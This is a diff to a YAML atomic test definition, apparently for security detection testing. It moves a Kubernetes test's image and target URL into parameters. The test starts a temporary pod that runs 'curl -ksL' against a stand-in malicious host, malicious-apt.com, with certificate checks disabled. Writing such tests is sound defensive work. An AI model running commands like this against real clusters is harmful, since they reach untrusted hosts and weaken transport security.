@@ -1280,6 +1280,14 @@ atomic_tests:
       description: K8s pod_name to execute the command in
       type: string
       default: atomic-insecure-curl
+    remote_url:
+      description: Remote URL to curl
+      type: string
+      default: https://malicious-apt.com
+    image_name:
+      description: Name of the docker image
+      type: string
+      default: curlimages/curl
   dependencies:
   - description: kubectl must be installed and configured
     get_prereq_command: |
@@ -1290,4 +1298,4 @@ atomic_tests:
     name: bash
     elevation_required: false
     command: |
-      kubectl run #{pod_name} --image=curlimages/curl --restart=Never --rm -it -- curl -ksL https://malicious-apt.com
+      kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm -it -- curl -ksL #{remote_url}
